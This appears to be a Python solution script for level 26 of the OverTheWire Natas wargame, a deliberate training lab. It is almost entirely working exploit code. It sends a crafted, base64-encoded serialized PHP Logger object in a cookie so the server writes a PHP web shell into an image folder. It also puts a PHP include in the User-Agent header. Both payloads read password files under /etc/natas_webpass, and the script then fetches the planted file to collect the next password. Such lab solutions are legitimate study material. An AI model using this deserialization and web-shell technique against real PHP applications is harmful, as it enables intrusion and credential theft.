import requests
import re
import base64
from natas_utility import *
import html
import random

current_level = 26
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

url = base_url
headers = {'User-Agent': '<?php echo \'password:\'; include(\'/etc/natas_webpass/natas26\') ?>'}

session = requests.session()

file_name = 'img/{}.php'.format(str(random.randint(1000, 9999)))

payload = base64.b64encode(('O:6:"Logger":3:{s:15:"\00Logger\00logFile";s:12:"' +
                            file_name +
                            '";s:15:"\00Logger\00initMsg";s:21:"#--session started--#";s:15:"\00Logger\00exitMsg";s:51:'
                            '"<?php passthru(\'cat /etc/natas_webpass/natas27\') ?>";}'
                            ).encode('ascii')
                           ).decode('ascii')

cookies = {'drawing': payload}

response = session.get(url, auth=auth, headers=headers, cookies=cookies)

content = html.unescape(session.get(url + '/{}'.format(file_name), auth=auth, headers=headers, cookies=cookies).content
                        .decode('utf-8')).replace('<br />', '\n').replace('<br>', '\n')

password_regex = re.compile(r'(.+)\n')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
